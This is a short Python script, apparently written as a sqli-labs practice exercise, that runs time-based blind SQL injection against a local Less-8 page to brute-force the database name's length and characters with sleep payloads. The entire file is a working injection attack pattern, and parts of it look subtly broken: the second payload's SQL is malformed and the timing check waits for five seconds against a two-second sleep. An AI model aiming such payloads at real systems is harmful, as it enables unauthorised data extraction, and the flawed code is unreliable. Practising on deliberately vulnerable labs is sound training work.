import requests

url = "http://localhost/sqli-labs-php7/Less-8/?id=0' "
fact="You are in..........."

for i in range(100):
    length = url + "or 1=1 and length(database())=" + str(i) + " and sleep(2)-- -"
    result=requests.get(length)
    if result.elapsed.seconds>=5:
        print (i)
        length=i
        break

options='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
flag=''
for i in range(8):
    for j in options:
        name = url + "or 1=1 and if database() like binary '"+flag+j+"%' sleep(2)-- -"
        result=requests.get(name)
        if result.elapsed.seconds>=5:
            flag=flag+j
            print (flag)
print('\n'+flag)
